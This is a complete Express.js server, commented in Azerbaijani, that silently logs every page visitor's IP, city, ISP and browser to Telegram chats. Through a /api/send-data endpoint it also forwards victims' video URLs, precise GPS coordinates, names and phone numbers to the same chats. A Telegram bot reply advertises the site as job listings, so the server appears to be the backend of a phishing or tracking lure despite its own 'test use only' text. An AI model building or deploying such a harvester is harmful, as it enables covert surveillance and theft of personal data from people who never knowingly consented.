// server.js
const express = require('express');
const path = require('path');
const cors = require('cors');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// ================== CONFIG ==================
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_IDS = process.env.TELEGRAM_CHAT_IDS
  ? process.env.TELEGRAM_CHAT_IDS.split(',').map(id => id.trim())
  : [];

if (!TELEGRAM_BOT_TOKEN || TELEGRAM_CHAT_IDS.length === 0) {
  console.error('❌ Telegram token və ya chat ID-lər tapılmadı!');
} else {
  console.log('✅ Telegram hazırdır');
  console.log('👥 Adminlər:', TELEGRAM_CHAT_IDS);
}

// ================== MIDDLEWARE ==================
app.use(cors());
app.use(express.json({ limit: '50mb' }));

// ================== HELPERS ==================
function getClientIp(req) {
  // Render / proxy üçün
  const xf = req.headers['x-forwarded-for'];
  if (xf) return xf.split(',')[0].trim();
  return req.socket?.remoteAddress || 'unknown';
}

// ================== TELEGRAM SENDER ==================
async function sendToTelegram(text) {
  for (const chatId of TELEGRAM_CHAT_IDS) {
    try {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text
        })
      });
    } catch (e) {
      console.error('Telegram göndərmə xətası:', e.message);
    }
  }
}

// ================== GEO HELPER ==================
async function getGeoInfo(ip) {
  try {
    const cleanIp = (ip || '').replace('::ffff:', '').split(',')[0].trim();

    // Local / private IP-ləri skip et
    if (
      !cleanIp ||
      cleanIp === 'unknown' ||
      cleanIp === '127.0.0.1' ||
      cleanIp === '::1' ||
      cleanIp.startsWith('192.168.') ||
      cleanIp.startsWith('10.') ||
      cleanIp.startsWith('172.')
    ) {
      return { country: 'Local', city: 'Local', isp: 'Local' };
    }

    const r = await fetch(`http://ip-api.com/json/${cleanIp}?fields=status,country,city,isp,query`);
    const data = await r.json();
    if (data.status === 'success') {
      return { country: data.country, city: data.city, isp: data.isp };
    }
    return {};
  } catch (e) {
    return {};
  }
}

// ================== GLOBAL VISITOR LOGGER ==================
// Bu middleware HƏR səhifə sorğusunu tutur - JS, icazə, brauzer fərq etmir.
// Yalnız HTML səhifə sorğularını loglayır (CSS, JS, şəkil faylları yox).

const loggedIPs = new Map(); // IP -> timestamp (spam qarşısını almaq üçün)
const LOG_COOLDOWN_MS = 30000; // 30 saniyə

app.use(async (req, res, next) => {
  try {
    const isPageRequest =
      req.method === 'GET' &&
      !req.path.startsWith('/api/') &&
      !req.path.startsWith('/webhook/') &&
      !req.path.match(/\.(css|js|png|jpg|jpeg|gif|svg|ico|woff|woff2|ttf|map|json)$/i);

    if (isPageRequest) {
      const ip = getClientIp(req);
      const now = Date.now();
      const lastSeen = loggedIPs.get(ip);

      if (!lastSeen || (now - lastSeen) > LOG_COOLDOWN_MS) {
        loggedIPs.set(ip, now);

        // Asinxron göndər - istifadəçini gözlətmə
        (async () => {
          const geo = await getGeoInfo(ip);
          let msg = `🚨 YENİ ZİYARƏTÇİ\n`;
          msg += `🛰️ IP: ${ip}\n`;
          if (geo.country && geo.country !== 'Local') {
            msg += `🌍 Ölkə: ${geo.country}\n`;
            if (geo.city) msg += `🏙️ Şəhər: ${geo.city}\n`;
            if (geo.isp) msg += `📡 ISP: ${geo.isp}\n`;
          } else {
            msg += `📍 Lokasiya: Local / bilinmir\n`;
          }
          msg += `🖥️ UA: ${(req.headers['user-agent'] || 'bilinmir').substring(0, 100)}\n`;
          msg += `🔗 Path: ${req.path}\n`;
          msg += `⏰ ${new Date().toISOString()}`;

          await sendToTelegram(msg.trim());
        })();
      }
    }
  } catch (e) {
    console.error('Visitor logger xətası:', e.message);
  }
  next();
});

// Statik fayllar (middleware-dən SONRA)
app.use(express.static(path.join(__dirname, 'public')));

// ================== API ==================
app.post('/api/send-data', async (req, res) => {
  try {
    const { videoUrl, location, action, name, phone } = req.body;

    const ip = getClientIp(req);

    let message = '';
    message += `🛰️ IP: ${ip}\n`;

    if (action) {
      message += `🧩 Action: ${action}\n`;
    }

    if (name || phone) {
      message += `👤 Ad: ${name || 'yox'}\n`;
      message += `📞 Telefon: ${phone || 'yox'}\n`;
    }

    if (videoUrl) {
      message += `📹 Video URL: ${videoUrl}\n`;
    }

    if (location?.latitude && location?.longitude) {
      message += `📍 Region təsdiqləndi\n`;
      message += `🌍 ${location.latitude}, ${location.longitude}\n`;
      if (location.accuracy) message += `🎯 Dəqiqlik: ±${location.accuracy}m\n`;
    } else {
      message += `📍 Lokasiya yoxdur (icazə verilmədi)\n`;
    }

    // Əlavə olaraq geo məlumat serverdən
    const geo = await getGeoInfo(ip);
    if (geo.country && geo.country !== 'Local') {
      message += `🌐 Təxmini: ${geo.city || '?'}, ${geo.country}\n`;
    }

    await sendToTelegram(message.trim());
    res.json({ ok: true });

  } catch (err) {
    console.error('❌ API xətası:', err);
    res.status(500).json({ ok: false });
  }
});

// ================== TELEGRAM WEBHOOK ==================
app.post(`/webhook/${TELEGRAM_BOT_TOKEN}`, async (req, res) => {
  try {
    const msg = req.body.message;
    if (!msg || !msg.text) return res.sendStatus(200);

    const text = msg.text.trim();

    if (text === '/start') {
      await sendToTelegram(
        `👋 Xoş gəldiniz!
📌 İş elanlarını görmək üçün keçid:
👉 https://video-analyzer-server.onrender.com

ℹ️ Məlumat üçün /about`
      );
    }

    else if (text === '/about') {
      await sendToTelegram(
        `ℹ️ Bu sistem yalnız test və daxili istifadə üçündür.
Daxil edilən məlumatlar adminə bildirilir.`
      );
    }

    else if (text === '/link') {
      await sendToTelegram(
        `🔗 https://video-analyzer-server.onrender.com`
      );
    }

    res.sendStatus(200);
  } catch (e) {
    console.error('Webhook xətası:', e);
    res.sendStatus(200);
  }
});

// ================== FRONTEND (SPA fallback) ==================
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// ================== START ==================
app.listen(PORT, () => {
  console.log(`🚀 Server ${PORT} portunda işləyir`);
});
